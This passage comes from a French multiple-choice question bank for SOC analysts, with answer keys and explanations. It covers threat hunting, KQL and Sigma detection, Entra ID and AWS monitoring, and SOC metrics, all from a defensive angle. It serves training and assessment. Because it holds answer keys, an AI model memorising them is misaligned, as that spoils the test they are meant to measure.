> **Explication technique :** Une bonne hypothèse est précise, testable et liée à une technique (ici T1053.005), à un périmètre et à des sources de données disponibles. Elle permet de construire des requêtes ciblées et de conclure clairement par la présence ou l'absence d'activité.
>
> *Compétence évaluée : Threat Hunting / Hypothèse.*

### Question 153 – [Niveau : Fondamental]

En KQL, quel opérateur permet de filtrer les lignes d'une table selon une condition ?

- **A.** project
- **B.** extend
- **C.** where
- **D.** summarize

**Réponse correcte : C**

> **Explication technique :** where filtre les lignes (ex. | where EventID == 4625). project sélectionne ou renomme des colonnes, summarize agrège (count(), dcount()) et extend crée de nouvelles colonnes calculées. Ces opérateurs sont utilisés dans Microsoft Sentinel et dans l'advanced hunting de Defender XDR.
>
> *Compétence évaluée : Detection Engineering / KQL.*

### Question 154 – [Niveau : Fondamental]

Quel est l'intérêt principal du format Sigma ?

- **A.** Décrire des règles de pare-feu réseau.
- **B.** Écrire des règles de détection génériques pour les journaux, convertibles vers différents langages de SIEM (SPL, KQL, EQL, AQL…).
- **C.** Chiffrer les alertes transmises au SOAR.
- **D.** Écrire des signatures de fichiers et de mémoire (chaînes, motifs hexadécimaux) pour identifier des familles de malwares sur les terminaux.

**Réponse correcte : B**

> **Explication technique :** Sigma est un format ouvert en YAML pour les règles de détection basées sur les journaux. Des outils comme pySigma convertissent une règle vers le langage de la plateforme cible. YARA cible les fichiers et la mémoire, tandis que Snort et Suricata ciblent le trafic réseau.
>
> *Compétence évaluée : Detection Engineering / Sigma.*

### Question 155 – [Niveau : Fondamental]

Pourquoi établir une baseline (ligne de base) avant de rechercher des anomalies ?

- **A.** Pour figer la configuration de référence des serveurs et bloquer automatiquement tout logiciel installé après cette date.
- **B.** Pour supprimer tous les journaux anciens.
- **C.** Pour remplacer les règles de corrélation.
- **D.** Pour connaître le comportement normal de l'environnement et repérer les écarts significatifs.

**Réponse correcte : D**

> **Explication technique :** Sans connaissance du comportement normal (volumes, horaires, processus habituels, connexions usuelles), il est impossible de distinguer une anomalie d'une activité légitime. La baseline doit être régulièrement mise à jour pour tenir compte des évolutions de l'environnement.
>
> *Compétence évaluée : Threat Hunting / Baseline.*

### Question 156 – [Niveau : Fondamental]

Quel outil est principalement utilisé pour identifier des fichiers malveillants à partir de motifs textuels ou binaires ?

- **A.** YARA.
- **B.** Nmap.
- **C.** Wireshark.
- **D.** Zeek.

**Réponse correcte : A**

> **Explication technique :** YARA permet de décrire des familles de malwares avec des chaînes, des motifs hexadécimaux et des conditions logiques. Il est utilisé pour scanner des fichiers, des dumps mémoire et des répertoires lors du threat hunting et de la réponse aux incidents.
>
> *Compétence évaluée : Detection Engineering / YARA.*

### Question 157 – [Niveau : Intermédiaire]

Quelle requête KQL identifie les adresses IP ayant généré plus de 50 échecs de connexion Entra ID en une heure ?

- **A.** SigninLogs | project IPAddress | take 50
- **B.** SigninLogs | where ResultType != "0" | summarize Echecs = count() by IPAddress, bin(TimeGenerated, 1h) | where Echecs > 50
- **C.** SigninLogs | where ResultType == "0" | summarize Succes = count() by IPAddress, bin(TimeGenerated, 1h) | where Succes > 50
- **D.** SigninLogs | where ResultType == "0" | count

**Réponse correcte : B**

> **Explication technique :** Dans SigninLogs, ResultType "0" signifie un succès ; tout autre code indique un échec. summarize count() by IPAddress, bin(TimeGenerated, 1h) agrège par IP et par tranche horaire, puis le second where applique le seuil. Les autres requêtes ne réalisent ni filtrage des échecs ni agrégation.
>
> *Compétence évaluée : Detection Engineering / KQL agrégation.*

### Question 158 – [Niveau : Intermédiaire]

Un hunter liste tous les binaires exécutés au démarrage sur 5 000 postes et s'intéresse à ceux présents sur seulement 1 ou 2 machines. Quelle technique utilise-t-il ?

- **A.** Le fuzzing.
- **B.** Le load balancing.
- **C.** L'analyse de baseline par seuil statique (static threshold analysis).
- **D.** Le stack counting (analyse de fréquence / long tail analysis).

**Réponse correcte : D**

> **Explication technique :** Le stack counting consiste à agréger un attribut (processus, service, clé Run, DLL) sur l'ensemble du parc et à examiner les occurrences rares. Les éléments malveillants se trouvent souvent dans la « longue traîne », alors que les logiciels légitimes sont présents sur de nombreux postes.
>
> *Compétence évaluée : Threat Hunting / Stack counting.*

### Question 159 – [Niveau : Intermédiaire]

Un rapport CTI décrit une nouvelle campagne ciblant le secteur bancaire. Le SOC recherche immédiatement les TTP décrits dans ses données. Quel type de chasse est mené ?

- **A.** Une chasse purement aléatoire sans objectif.
- **B.** Une analyse de conformité réglementaire.
- **C.** Une chasse pilotée par le renseignement (intelligence-driven hunting).
- **D.** Une chasse pilotée par l'entité (entity-driven hunting) centrée sur les actifs critiques.

**Réponse correcte : C**

> **Explication technique :** On distingue généralement les chasses pilotées par hypothèse, par le renseignement (IOC et TTP issus de la CTI) et par l'entité ou la situation (actifs critiques, analyse de risques). Ici, le point de départ est un rapport CTI, ce qui caractérise une chasse pilotée par le renseignement.
>
> *Compétence évaluée : Threat Hunting / Types de chasse.*

### Question 160 – [Niveau : Intermédiaire]

Dans l'advanced hunting de Defender XDR, quelle table interroger pour rechercher les lignes de commande des processus lancés sur les postes ?

- **A.** DeviceProcessEvents.
- **B.** EmailAttachmentInfo.
- **C.** IdentityLogonEvents.
- **D.** DeviceInfo.

**Réponse correcte : A**

> **Explication technique :** DeviceProcessEvents contient les créations de processus avec les champs FileName, ProcessCommandLine, InitiatingProcessFileName et AccountName. DeviceNetworkEvents couvre les connexions, DeviceFileEvents les fichiers et DeviceRegistryEvents le registre. EmailAttachmentInfo concerne la messagerie et IdentityLogonEvents les authentifications.
>
> *Compétence évaluée : Detection Engineering / KQL Defender.*

### Question 161 – [Niveau : Intermédiaire]

Une règle de détection de PowerShell encodé génère 300 alertes par jour, toutes liées à un outil d'administration légitime (SCCM). Quelle approche de tuning est la plus appropriée ?

- **A.** Exclure de la règle toutes les commandes PowerShell encodées exécutées par un compte de service, quel que soit l'hôte ou le processus parent.
- **B.** Désactiver complètement la règle.
- **C.** Exclure tous les postes du domaine de la règle.
- **D.** Une exclusion précise (processus parent, binaire signé, compte de service), documentée et revue périodiquement.

**Réponse correcte : D**

> **Explication technique :** Le tuning doit réduire le bruit sans créer d'angle mort. Une exclusion trop large (tout PowerShell, tous les postes) offre une porte d'entrée aux attaquants. Une exclusion ciblée, documentée et réévaluée maintient la valeur de la détection.
>
> *Compétence évaluée : Detection Engineering / Tuning.*

### Question 162 – [Niveau : Intermédiaire]

Qu'est-ce qu'une détection « haute fidélité » ?

- **A.** Une détection qui couvre le plus grand nombre de techniques ATT&CK possible et génère beaucoup d'alertes, afin de ne manquer aucune attaque.
- **B.** Une détection fondée uniquement sur des adresses IP.
- **C.** Une détection dont la grande majorité des déclenchements correspondent à de vraies activités malveillantes.
- **D.** Une détection qui ne s'exécute qu'une fois par mois.

**Réponse correcte : C**

> **Explication technique :** La fidélité mesure la précision : peu de faux positifs pour un nombre donné de vrais positifs. Les détections haute fidélité peuvent souvent déclencher des réponses automatisées, alors que les signaux faibles sont plutôt agrégés (Risk-Based Alerting) ou utilisés pour la chasse.
>
> *Compétence évaluée : Detection Engineering / Fidélité.*

### Question 163 – [Niveau : Intermédiaire]

Quel apport principal offre l'UEBA (User and Entity Behavior Analytics) ?

- **A.** La modélisation du comportement normal de chaque utilisateur et entité pour en détecter les écarts.
- **B.** La mise à jour automatique des postes.
- **C.** Le chiffrement des communications entre utilisateurs.
- **D.** La corrélation de règles statiques sur des seuils fixes identiques pour tous les utilisateurs, afin de détecter les accès hors horaires.

**Réponse correcte : A**

> **Explication technique :** L'UEBA construit des profils comportementaux (horaires, volumes, ressources accédées, pairs) et attribue un score aux anomalies. Il est utile pour la détection de menaces internes et de comptes compromis. Dans Microsoft Sentinel, les résultats sont disponibles dans la table BehaviorAnalytics.
>
> *Compétence évaluée : Threat Hunting / UEBA.*

### Question 164 – [Niveau : Intermédiaire]

Comment valider qu'une nouvelle règle de détection fonctionne réellement ?

- **A.** Vérifier que la syntaxe de la requête est correcte et qu'elle renvoie des résultats sur les 30 derniers jours de données de production.
- **B.** Simuler la technique ciblée dans un environnement contrôlé (ex. Atomic Red Team) et vérifier que l'alerte se déclenche avec le bon contexte.
- **C.** Attendre une véritable attaque en production.
- **D.** Demander à l'éditeur du SIEM de valider la règle par e-mail.

**Réponse correcte : B**

> **Explication technique :** La validation par émulation d'adversaire (Atomic Red Team, MITRE Caldera, exercices Purple Team) confirme que les données nécessaires sont collectées et que la logique détecte bien la technique. Ces tests doivent être répétés régulièrement, car les sources et les formats évoluent.
>
> *Compétence évaluée : Detection Engineering / Validation.*

### Question 165 – [Niveau : Intermédiaire]

Dans Elastic, quel est l'intérêt d'une requête EQL de type « sequence by host.id » ?

- **A.** Détecter une suite ordonnée d'événements liés sur un même hôte dans une fenêtre de temps donnée.
- **B.** Regrouper tous les événements d'un même hôte et les trier chronologiquement, sans condition d'ordre ni de fenêtre temporelle entre eux.
- **C.** Convertir les journaux au format CSV.
- **D.** Supprimer les doublons dans un index.

**Réponse correcte : A**

> **Explication technique :** EQL (Event Query Language) permet d'exprimer des séquences temporelles corrélées par un champ commun (host.id, process.entity_id) avec une contrainte maxspan. C'est particulièrement utile pour modéliser des comportements d'attaque en plusieurs étapes.
>
> *Compétence évaluée : Detection Engineering / EQL séquence.*

### Question 166 – [Niveau : Avancé / Expert]

Un hunter veut repérer les comptes dont le volume de téléchargement SharePoint dévie fortement de leur historique. Quelle approche KQL est la plus adaptée ?

- **A.** Utiliser take 10 pour afficher dix événements au hasard.
- **B.** Construire une série temporelle par utilisateur avec make-series, puis appliquer series_decompose_anomalies() pour identifier les écarts significatifs.
- **C.** Appliquer un seuil fixe identique pour tous les utilisateurs (par exemple 500 téléchargements par jour) et trier les résultats par volume décroissant.
- **D.** Trier les utilisateurs par ordre alphabétique.

**Réponse correcte : B**

> **Explication technique :** make-series crée des séries temporelles régulières et series_decompose_anomalies() détecte les points s'écartant de la tendance et de la saisonnalité. Cette approche par utilisateur est plus pertinente qu'un seuil fixe global, car chaque profil a sa propre normalité.
>
> *Compétence évaluée : Threat Hunting / Détection d'anomalies statistiques.*

### Question 167 – [Niveau : Avancé / Expert]

Une équipe adopte le « Detection-as-Code ». Quelle pratique en fait partie ?

- **A.** Conserver les règles dans des fichiers Excel envoyés par e-mail.
- **B.** Interdire toute modification des règles après leur création.
- **C.** Exporter chaque semaine les règles du SIEM dans un fichier de sauvegarde et les modifier directement en production lorsque c'est nécessaire.
- **D.** Versionner les règles dans Git, les relire par pull request, les tester automatiquement dans un pipeline CI/CD, puis les déployer vers le SIEM.

**Réponse correcte : D**

> **Explication technique :** Le Detection-as-Code applique les pratiques du génie logiciel aux détections : gestion de versions, revue par les pairs, tests unitaires avec des journaux d'exemple, déploiement automatisé et possibilité de retour arrière. Cela améliore la qualité et la traçabilité des règles.
>
> *Compétence évaluée : Detection Engineering / Detection-as-Code.*

### Question 168 – [Niveau : Avancé / Expert]

Une matrice ATT&CK Navigator montre 70 % des techniques « couvertes » par au moins une règle. Pourquoi cet indicateur peut-il être trompeur ?

- **A.** Parce que le Navigator ne permet pas d'afficher des couleurs.
- **B.** Parce que le Navigator ne prend en compte que les règles développées en interne et ignore les détections natives fournies par l'éditeur du SIEM ou de l'EDR.
- **C.** Parce qu'une règle peut ne couvrir qu'une procédure spécifique d'une technique, ne pas avoir été testée ou dépendre de sources de données absentes.
- **D.** Parce qu'ATT&CK ne contient que des techniques Linux.

**Réponse correcte : C**

> **Explication technique :** La couverture ATT&CK doit être qualifiée : profondeur (nombre de procédures détectées), validation par tests, qualité des données et pertinence au regard des menaces prioritaires. Un score de couverture binaire donne une fausse impression de sécurité.
>
> *Compétence évaluée : Detection Engineering / Couverture ATT&CK.*

### Question 169 – [Niveau : Avancé / Expert]

Lors d'une chasse, un hunter remarque que w3wp.exe (IIS) a lancé cmd.exe, qui exécute whoami et net user. Quelle hypothèse est la plus probable et quelle suite donner ?

- **A.** Il s'agit d'une maintenance IIS normale : le pool d'applications lance cmd.exe pour vérifier les comptes lors du recyclage, ce qui ne nécessite aucune action.
- **B.** L'utilisateur a ouvert une session RDP sur le serveur.
- **C.** Un web shell probable : rechercher les fichiers .aspx récents et analyser les journaux IIS associés.
- **D.** Le serveur subit un déni de service.

**Réponse correcte : C**

> **Explication technique :** Le processus de travail IIS ne devrait pas lancer d'interpréteur de commandes. Cette relation parent-enfant indique fortement un web shell (T1505.003) suivi de commandes de reconnaissance. Les journaux IIS permettent d'identifier les requêtes POST vers le fichier malveillant et l'IP source.
>
> *Compétence évaluée : Threat Hunting / Rareté parent-enfant.*

### Question 170 – [Niveau : Avancé / Expert]

Une chasse ne trouve aucune trace d'activité malveillante. Quelle conclusion et quelle action sont appropriées ?

- **A.** Supprimer les requêtes, car elles n'ont rien trouvé.
- **B.** Considérer que l'hypothèse est réfutée et que l'environnement est sain, puis archiver la chasse sans autre documentation que la conclusion.
- **C.** Conclure que le threat hunting est inutile.
- **D.** Documenter hypothèse, données, requêtes et limites, puis industrialiser les requêtes utiles.

**Réponse correcte : D**

> **Explication technique :** Une chasse sans résultat reste précieuse : elle réduit l'incertitude, révèle parfois des lacunes de données et produit des requêtes réutilisables. Le modèle PEAK et le Hunting Maturity Model insistent sur la documentation et l'automatisation des chasses réussies.
>
> *Compétence évaluée : Detection Engineering / Biais du hunting.*

## Module 9 – Cloud Security and Identity Monitoring

### Question 171 – [Niveau : Fondamental]

Dans le modèle de responsabilité partagée d'un service IaaS, qui est responsable de la configuration du système d'exploitation des machines virtuelles et de leurs journaux ?

- **A.** Le client.
- **B.** Le fournisseur d'accès à Internet.
- **C.** L'éditeur du système d'exploitation.
- **D.** Uniquement le fournisseur cloud.

**Réponse correcte : A**

> **Explication technique :** En IaaS, le fournisseur sécurise l'infrastructure physique et l'hyperviseur ; le client gère le système d'exploitation, les applications, les identités, la configuration réseau et la journalisation de ses ressources. En SaaS, la part du client se réduit principalement aux identités, aux données et à la configuration.
>
> *Compétence évaluée : Cloud Security / Responsabilité partagée.*

### Question 172 – [Niveau : Fondamental]

Qu'est-ce qu'une alerte « impossible travel » ?

- **A.** Une connexion depuis un pays figurant sur la liste des pays interdits par la politique de voyage de l'entreprise, détectée par l'accès conditionnel.
- **B.** Deux connexions d'un même compte depuis des localisations géographiques trop éloignées pour être parcourues dans l'intervalle de temps observé.
- **C.** Une connexion depuis un appareil mobile.
- **D.** Une tentative de connexion pendant un vol en avion.

**Réponse correcte : B**

> **Explication technique :** L'impossible travel compare les géolocalisations et horodatages successifs d'un compte. Il peut indiquer l'usage d'identifiants volés, mais génère des faux positifs liés aux VPN, proxys et sorties Internet d'entreprise. Le contexte (appareil, IP connue, MFA) aide à qualifier l'alerte.
>
> *Compétence évaluée : Identity Monitoring / Impossible travel.*

### Question 173 – [Niveau : Fondamental]

En quoi consiste une attaque par « MFA fatigue » ?

- **A.** Intercepter le code MFA envoyé par SMS grâce à un transfert de ligne (SIM swapping), puis l'utiliser avec le mot de passe compromis.
- **B.** Multiplier les demandes MFA vers un compte dont le mot de passe est volé, jusqu'à une acceptation par lassitude.
- **C.** Voler le téléphone de l'utilisateur.
- **D.** Saturer le serveur d'authentification par un déni de service.

**Réponse correcte : B**

> **Explication technique :** Cette technique (T1621 – Multi-Factor Authentication Request Generation) a été utilisée dans plusieurs compromissions médiatisées. Les contre-mesures incluent le « number matching » de Microsoft Authenticator, l'affichage du contexte géographique, la limitation des demandes et les méthodes résistantes au phishing.
>
> *Compétence évaluée : Identity Monitoring / MFA fatigue.*

### Question 174 – [Niveau : Fondamental]

Quel journal Azure enregistre les opérations de gestion (plan de contrôle) sur les ressources, comme la création d'une machine virtuelle ou la modification d'un groupe de sécurité réseau ?

- **A.** Le journal d'activité Azure (Azure Activity Log).
- **B.** Le journal de connexion Entra ID (Sign-in logs).
- **C.** Le journal DNS du poste de l'administrateur.
- **D.** Le journal Windows Security de la machine virtuelle.

**Réponse correcte : A**

> **Explication technique :** L'Activity Log trace les opérations Azure Resource Manager : qui a fait quoi, sur quelle ressource et quand. Les Sign-in logs d'Entra ID tracent les authentifications et les Audit logs les modifications de l'annuaire. L'équivalent est AWS CloudTrail chez AWS et Cloud Audit Logs chez Google Cloud.
>
> *Compétence évaluée : Cloud Security / Journaux Azure.*

### Question 175 – [Niveau : Intermédiaire]

Dans les journaux de connexion Entra ID, un analyste observe de nombreux ResultType 50126 pour des comptes différents depuis une même IP, puis un ResultType 0. Quelle interprétation est la plus probable ?

- **A.** Une synchronisation normale d'Entra Connect, dont le compte de service s'authentifie successivement pour chaque utilisateur synchronisé.
- **B.** Une erreur de configuration DNS.
- **C.** Une attaque par password spraying ayant abouti à au moins une authentification réussie.
- **D.** Une maintenance planifiée d'Entra ID.

**Réponse correcte : C**

> **Explication technique :** Le code 50126 indique un nom d'utilisateur ou un mot de passe invalide ; le code 0 indique un succès. Des échecs répartis sur de nombreux comptes depuis une même source, suivis d'un succès, caractérisent un password spraying réussi. Il faut investiguer le compte compromis : sessions, MFA, règles de boîte aux lettres, consentements.
>
> *Compétence évaluée : Identity Monitoring / Codes d'erreur Entra ID.*

### Question 176 – [Niveau : Intermédiaire]

Pourquoi le SOC recommande-t-il de bloquer l'authentification héritée (legacy authentication, ex. IMAP, POP, SMTP AUTH basique) dans Entra ID ?

- **A.** Parce qu'ils chiffrent trop fortement les échanges.
- **B.** Parce qu'ils transmettent les mots de passe en clair sur Internet, ce qui permet leur interception, alors qu'ils prennent en charge le MFA.
- **C.** Parce qu'ils empêchent la synchronisation des calendriers.
- **D.** Parce que ces protocoles ne prennent pas en charge le MFA et sont massivement utilisés pour le password spraying.

**Réponse correcte : D**

> **Explication technique :** L'authentification basique permet de contourner le MFA. Microsoft a largement désactivé l'authentification basique dans Exchange Online, mais le blocage par Conditional Access et la surveillance du champ ClientAppUsed dans SigninLogs restent des bonnes pratiques.
>
> *Compétence évaluée : Identity Monitoring / Legacy authentication.*

### Question 177 – [Niveau : Intermédiaire]

Quel mécanisme Microsoft permet d'attribuer des rôles privilégiés Entra ID de manière temporaire et à la demande, avec approbation et justification ?

- **A.** Self-Service Password Reset (SSPR).
- **B.** Azure Front Door.
- **C.** Privileged Identity Management (PIM).
- **D.** Microsoft Intune Company Portal.

**Réponse correcte : C**

> **Explication technique :** PIM permet l'accès « just-in-time » : les rôles sont « éligibles » et activés pour une durée limitée, avec MFA, justification et éventuellement approbation. Le SOC surveille les activations hors horaires, les attributions permanentes et les ajouts directs à des rôles comme Global Administrator.
>
> *Compétence évaluée : Identity Monitoring / Comptes privilégiés.*

### Question 178 – [Niveau : Intermédiaire]

Un compte de direction se connecte depuis un appareil non géré dans un pays inhabituel. Quelle fonctionnalité Entra ID permet de bloquer ou d'exiger un MFA renforcé selon ces signaux ?

- **A.** L'accès conditionnel (Conditional Access), éventuellement combiné aux niveaux de risque d'Entra ID Protection.
- **B.** Les groupes dynamiques basés sur la localisation et le type d'appareil, qui retirent automatiquement les droits d'accès.
- **C.** Les unités administratives.
- **D.** Le portail Mes applications.

**Réponse correcte : A**

> **Explication technique :** Le Conditional Access évalue des signaux (utilisateur, appareil, localisation, application, risque de connexion) et applique des décisions : bloquer, exiger le MFA, exiger un appareil conforme. Entra ID Protection fournit les niveaux de risque de connexion et d'utilisateur utilisables dans ces politiques.
>
> *Compétence évaluée : Cloud Security / Conditional Access.*

### Question 179 – [Niveau : Intermédiaire]

Un utilisateur a accordé à une application tierce inconnue les permissions Mail.ReadWrite et offline_access. Quelle attaque est suspectée ?

- **A.** Une attaque par force brute ayant permis d'obtenir le mot de passe, l'application servant uniquement à synchroniser la messagerie sur mobile.
- **B.** Une mise à jour légitime de Microsoft Outlook.
- **C.** Une attaque DDoS contre Exchange Online.
- **D.** Un consentement illicite (illicit consent grant) offrant un accès durable sans le mot de passe.

**Réponse correcte : D**

> **Explication technique :** Les applications OAuth malveillantes obtiennent des jetons d'accès et de rafraîchissement : la réinitialisation du mot de passe ne suffit pas à couper l'accès. Il faut révoquer le consentement, supprimer le service principal, révoquer les sessions et restreindre le consentement utilisateur aux éditeurs vérifiés.
>
> *Compétence évaluée : Cloud Security / Consentement OAuth.*

### Question 180 – [Niveau : Intermédiaire]

Dans AWS, quel service génère des détections de menaces à partir de CloudTrail, des journaux de flux VPC et des requêtes DNS ?

- **A.** AWS Lambda.
- **B.** Amazon GuardDuty.
- **C.** Amazon Route 53 Domains.
- **D.** Amazon S3 Glacier.

**Réponse correcte : B**

> **Explication technique :** GuardDuty analyse en continu les événements CloudTrail, les VPC Flow Logs et les journaux DNS (et d'autres sources selon les protections activées) pour détecter des comportements malveillants : minage de cryptomonnaie, appels API anormaux, communications avec des IP malveillantes. Ses résultats peuvent être envoyés vers le SIEM.
>
> *Compétence évaluée : Cloud Security / AWS.*

### Question 181 – [Niveau : Intermédiaire]

Un journal CloudTrail montre l'appel PutBucketPolicy rendant un bucket S3 contenant des données clients accessible publiquement, effectué par une clé d'accès créée la veille. Quelle action est prioritaire ?

- **A.** Changer uniquement la région AWS du bucket.
- **B.** Supprimer définitivement le bucket et ses données pour éliminer l'exposition, puis recréer un bucket privé à partir des sauvegardes.
- **C.** Ignorer l'événement, car les buckets publics sont courants.
- **D.** Rétablir l'accès privé du bucket, désactiver la clé d'accès concernée et analyser les accès aux objets pendant la période d'exposition.

**Réponse correcte : D**

> **Explication technique :** L'exposition de stockage cloud est une cause fréquente de fuites de données. Le confinement consiste à corriger la politique, révoquer les identifiants suspects et vérifier les accès (journaux d'accès S3, événements de données CloudTrail) afin d'évaluer s'il y a eu fuite et d'en informer la gouvernance.
>
> *Compétence évaluée : Cloud Security / Stockage exposé.*

### Question 182 – [Niveau : Avancé / Expert]

Un compte présente une connexion réussie avec MFA depuis la France, puis, 10 minutes plus tard, des accès à Exchange Online depuis une IP d'hébergeur à l'étranger réutilisant le même identifiant de session, sans nouvelle demande MFA. Quelle hypothèse est la plus probable ?

- **A.** Une synchronisation normale entre deux centres de données Microsoft, qui réutilise l'identifiant de session de l'utilisateur pour répliquer sa boîte aux lettres.
- **B.** Un vol et un rejeu de jeton ou de cookie de session (token replay), par exemple suite à un phishing AiTM ou à un infostealer.
- **C.** Un changement de mot de passe programmé.
- **D.** Une panne du service MFA.

**Réponse correcte : B**

> **Explication technique :** Le rejeu d'un jeton déjà validé contourne le MFA (T1550.004, T1539). La réponse inclut la révocation des sessions (revoke sessions), la réinitialisation des identifiants, la vérification des règles de boîte et des appareils enregistrés, et des mesures comme la protection des jetons et l'accès conditionnel basé sur la conformité des appareils.
>
> *Compétence évaluée : Identity Monitoring / Vol de jeton.*

### Question 183 – [Niveau : Avancé / Expert]

Après la compromission d'un compte administrateur Entra ID, quels éléments doivent être vérifiés pour s'assurer que l'attaquant n'a pas créé de persistance ?

- **A.** Secrets ajoutés aux applications, méthodes MFA, rôles attribués, domaines fédérés et accès conditionnel.
- **B.** Le nombre de licences Microsoft 365 attribuées.
- **C.** Uniquement l'historique de navigation de l'administrateur.
- **D.** La date du dernier changement de mot de passe et la liste des connexions réussies : si le mot de passe a été réinitialisé, aucune persistance n'est possible.

**Réponse correcte : A**

> **Explication technique :** Les attaquants cloud créent des portes dérobées : identifiants ajoutés aux applications (T1098.001), méthodes MFA supplémentaires (T1098.005), domaines fédérés malveillants (T1484.002), exclusions d'accès conditionnel. Les Audit logs d'Entra ID sont la source principale pour ces vérifications.
>
> *Compétence évaluée : Identity Monitoring / Persistance cloud.*

### Question 184 – [Niveau : Avancé / Expert]

Quelle requête KQL est la plus pertinente pour détecter une MFA fatigue dans Microsoft Sentinel ?

- **A.** SigninLogs | where ResultType == "0" | take 10
- **B.** SecurityEvent | where EventID == 4688
- **C.** SigninLogs | where ResultType == "500121" | summarize Refus = count(), IPs = make_set(IPAddress) by UserPrincipalName, bin(TimeGenerated, 1h) | where Refus > 5
- **D.** SigninLogs | where ResultType == "50126" | summarize Echecs = count() by IPAddress, bin(TimeGenerated, 1h) | where Echecs > 5

**Réponse correcte : C**

> **Explication technique :** Le code 500121 correspond à un échec lors de l'authentification forte (demande MFA refusée ou non complétée). Un nombre élevé de refus pour un même utilisateur sur une courte période, suivi éventuellement d'un succès, est caractéristique d'une MFA fatigue. make_set() fournit le contexte des IP sources.
>
> *Compétence évaluée : Cloud Security / Requête KQL identité.*

### Question 185 – [Niveau : Avancé / Expert]

Comment le SOC doit-il surveiller les comptes d'accès d'urgence (« break-glass ») d'Entra ID ?

- **A.** Ils doivent être soumis aux mêmes politiques d'accès conditionnel et de MFA que les autres administrateurs, et utilisés chaque jour pour vérifier leur bon fonctionnement.
- **B.** Ils ne nécessitent aucune surveillance, car ils sont rarement utilisés.
- **C.** Ils doivent être exclus des politiques susceptibles de les bloquer, mais toute connexion doit générer une alerte de haute sévérité immédiate.
- **D.** Ils doivent partager le mot de passe de l'administrateur principal.

**Réponse correcte : C**

> **Explication technique :** Les comptes break-glass permettent de récupérer l'accès en cas de panne du MFA ou d'erreur de configuration. Leur usage doit rester exceptionnel. Microsoft recommande d'alerter sur toute connexion de ces comptes, de protéger leurs identifiants et de tester périodiquement leur fonctionnement de façon contrôlée.
>
> *Compétence évaluée : Cloud Security / Comptes d'urgence.*

## Module 10 – SOC Reporting and Operational Excellence

### Question 186 – [Niveau : Fondamental]

Que mesure le MTTD (Mean Time To Detect) ?

- **A.** Le nombre moyen d'alertes traitées par analyste.
- **B.** Le délai moyen entre la détection d'un incident et la fin de son confinement.
- **C.** Le délai moyen de remplacement d'un disque défectueux.
- **D.** Le délai moyen entre le début d'une activité malveillante et sa détection.

**Réponse correcte : D**

> **Explication technique :** Le MTTD reflète l'efficacité de la détection. Un MTTD élevé signifie que l'attaquant opère longtemps sans être repéré (dwell time). Le MTTR mesure quant à lui le délai de réponse ou de résolution, selon la définition retenue par l'organisation.
>
> *Compétence évaluée : SOC Reporting / MTTD.*

### Question 187 – [Niveau : Fondamental]

Qu'est-ce qu'un SLA dans le contexte d'un SOC ?

- **A.** Un engagement fixant notamment les délais de prise en charge et de notification par sévérité.
- **B.** Un protocole de transfert de fichiers.
- **C.** Une signature antivirale.
- **D.** Un document interne listant les sources de journaux, leurs formats et la durée de rétention associée à chacune.

**Réponse correcte : A**

> **Explication technique :** Le Service Level Agreement fixe des engagements mesurables : par exemple, prise en charge d'un incident critique en 15 minutes et notification au client en 30 minutes. Il est particulièrement important dans les relations avec un MSSP et doit être suivi par des KPI.
>
> *Compétence évaluée : SOC Reporting / SLA.*

### Question 188 – [Niveau : Fondamental]

Quelle est la fonction d'un playbook dans un SOC ?

- **A.** Définir la stratégie de détection de l'entreprise, la liste des cas d'usage du SIEM et le budget annuel du SOC.
- **B.** Décrire le traitement standardisé d'un type d'incident : analyse, décisions, escalade et réponse.
- **C.** Stocker les journaux pendant la durée légale.
- **D.** Lister les mots de passe des comptes administrateurs.

**Réponse correcte : B**

> **Explication technique :** Les playbooks garantissent un traitement cohérent et reproductible, quel que soit l'analyste. Ils peuvent être en partie automatisés dans un SOAR. Le runbook désigne souvent une procédure plus technique et détaillée pour une tâche précise.
>
> *Compétence évaluée : SOC Reporting / Playbook.*

### Question 189 – [Niveau : Fondamental]

Quel est l'objectif principal de la passation de poste (shift handover) ?

- **A.** Changer les mots de passe de la console SIEM.
- **B.** Réaliser l'inventaire du matériel et réattribuer automatiquement toutes les alertes non traitées à l'analyste le plus expérimenté de l'équipe suivante.
- **C.** Assurer la continuité du traitement en transmettant les incidents en cours, les actions en attente et les points de vigilance à l'équipe suivante.
- **D.** Supprimer les alertes non traitées.

**Réponse correcte : C**

> **Explication technique :** Dans un SOC 24/7, une mauvaise passation peut entraîner l'oubli d'un incident ou d'un délai SLA. Un rapport de passation structuré (incidents ouverts, escalades, changements, problèmes d'outillage, alertes à surveiller) et un échange oral sont recommandés.
>
> *Compétence évaluée : SOC Reporting / Shift handover.*

### Question 190 – [Niveau : Fondamental]

Quel tableau de bord est le plus adapté à un comité de direction ?

- **A.** Une synthèse des tendances de risque, des incidents majeurs, de leur impact métier et des KPI.
- **B.** La liste détaillée des alertes du SIEM classées par règle, avec le temps de traitement de chaque analyste.
- **C.** Les journaux Windows bruts des contrôleurs de domaine.
- **D.** Les requêtes KQL utilisées par les analystes.

**Réponse correcte : A**

> **Explication technique :** Chaque public a besoin d'un niveau d'information adapté : opérationnel pour les analystes (files d'attente, alertes), tactique pour le management du SOC (KPI, charge), stratégique pour la direction (risque, tendances, impact, investissements).
>
> *Compétence évaluée : SOC Reporting / Tableau de bord.*

### Question 191 – [Niveau : Intermédiaire]

Un SOC a traité 4 incidents avec des délais de résolution de 2 h, 4 h, 6 h et 12 h. Quel est le MTTR ?

- **A.** 4 heures.
- **B.** 6 heures.
- **C.** 12 heures.
- **D.** 24 heures.

**Réponse correcte : B**

> **Explication technique :** Le MTTR est la moyenne des délais : (2 + 4 + 6 + 12) / 4 = 24 / 4 = 6 heures. En pratique, il est utile de compléter la moyenne par la médiane et les percentiles, car quelques incidents très longs peuvent fausser la perception.
>
> *Compétence évaluée : SOC Reporting / MTTR.*

### Question 192 – [Niveau : Intermédiaire]

Quel indicateur reflète le mieux la qualité des détections du SOC ?

- **A.** La taille de l'écran de la salle SOC.
- **B.** Le nombre total de journaux collectés par jour.
- **C.** Le nombre total d'alertes générées par jour, car un volume élevé démontre une couverture de détection étendue.
- **D.** Le ratio de vrais positifs par rapport au total des alertes, suivi par règle de détection.

**Réponse correcte : D**

> **Explication technique :** Le taux de vrais positifs par règle permet d'identifier les règles bruyantes à optimiser et celles qui apportent de la valeur. Les volumes de journaux ou de tickets mesurent l'activité mais pas la qualité ni l'efficacité.
>
> *Compétence évaluée : SOC Reporting / KPI vs métriques.*

### Question 193 – [Niveau : Intermédiaire]

Quelle structure est recommandée pour un rapport d'incident destiné à la direction et aux équipes techniques ?

